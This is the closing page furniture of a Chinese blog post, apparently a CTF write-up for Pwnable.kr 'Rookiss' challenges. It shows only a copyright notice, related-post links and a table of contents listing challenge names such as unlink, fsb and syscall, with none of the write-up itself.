</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Firework</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/18/Pwnable_2_Rookiss/">http://example.com/2021/10/18/Pwnable_2_Rookiss/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Firework</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://fireworkxzww.top//pic/005BYxJSly1h0ko8f5r8ej314y0qqtcm.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/25/Ptrace%E5%8E%9F%E7%90%86%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/"><img class="prev-cover" src="https://fireworkxzww.top//pic/005BYxJSly1h0iddwtw6pj30zk0qoq93.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Ptrace原理与反调试</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/18/FormatString/"><img class="next-cover" src="https://fireworkxzww.top//pic/005BYxJSly1gx2nps63nbj30zk0nptdq.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Format String Analysis Report</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/07/16/Pwnablekr_1/" title="Pwnable_game题解_1"><img class="cover" src="https://i.loli.net/2021/04/14/lRpdG9awJtTnovg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-16</div><div class="title">Pwnable_game题解_1</div></div></a></div><div><a href="/2021/09/11/EzRop/" title="Return Oriented Programming Report"><img class="cover" src="https://api.dujin.org/bing/1920.php" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-11</div><div class="title">Return Oriented Programming Report</div></div></a></div><div><a href="/2021/09/18/FormatString/" title="Format String Analysis Report"><img class="cover" src="https://fireworkxzww.top//pic/005BYxJSly1gx2nps63nbj30zk0nptdq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-18</div><div class="title">Format String Analysis Report</div></div></a></div><div><a href="/2021/04/12/Linux程序保护机制/" title="Linux程序保护机制"><img class="cover" src="https://i.loli.net/2021/04/18/VqduSoB2nyTh1Fr.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-12</div><div class="title">Linux程序保护机制</div></div></a></div><div><a href="/2021/06/16/Web_1/" title="Web题解_natas"><img class="cover" src="https://i.loli.net/2021/04/20/1lHZ9MiDByNdQ2U.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-16</div><div class="title">Web题解_natas</div></div></a></div><div><a href="/2021/04/08/linux_Base/" title="linux_base题解"><img class="cover" src="https://i.loli.net/2021/04/20/fQiZcWtFpVdG1mu.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-08</div><div class="title">linux_base题解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink"><span class="toc-number">1.</span> <span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#brain-fuck"><span class="toc-number">2.</span> <span class="toc-text">brain fuck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-calculator"><span class="toc-number">3.</span> <span class="toc-text">md5 calculator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-login"><span class="toc-number">4.</span> <span class="toc-text">simple login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opt"><span class="toc-number">5.</span> <span class="toc-text">opt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ascii-easy"><span class="toc-number">6.</span> <span class="toc-text">ascii_easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tiny-easy"><span class="toc-number">7.</span> <span class="toc-text">tiny_easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fsb"><span class="toc-number">8.</span> <span class="toc-text">fsb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dragon"><span class="toc-number">9.</span> <span class="toc-text">dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix"><span class="toc-number">10.</span> <span class="toc-text">fix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#syscall"><span class="toc-number">11.</span> <span class="toc-text">syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">11.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BF%AE%E6%94%B9SYS-CALL-TABLE"><span class="toc-number">11.2.</span> <span class="toc-text">方法二 修改SYS_CALL_TABLE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E8%87%AA%E8%AE%BEsyscall"><span class="toc-number">11.3.</span> <span class="toc-text">方法三 自设syscall</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypton1"><span class="toc-number">12.</span> <span class="toc-text">crypton1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo1"><span class="toc-number">13.</span> <span class="toc-text">echo1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo2"><span class="toc-number">14.</span> <span class="toc-text">echo2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa-calculator"><span class="toc-number">15.</span> <span class="toc-text">rsa_calculator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-number">16.</span> <span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#alloca-c"><span class="toc-number">17.</span> <span class="toc-text">alloca.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#loveletter"><span class="toc-number">18.</span> <span class="toc-text">loveletter</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Firework</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,welcome to my world.Hava a good day!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>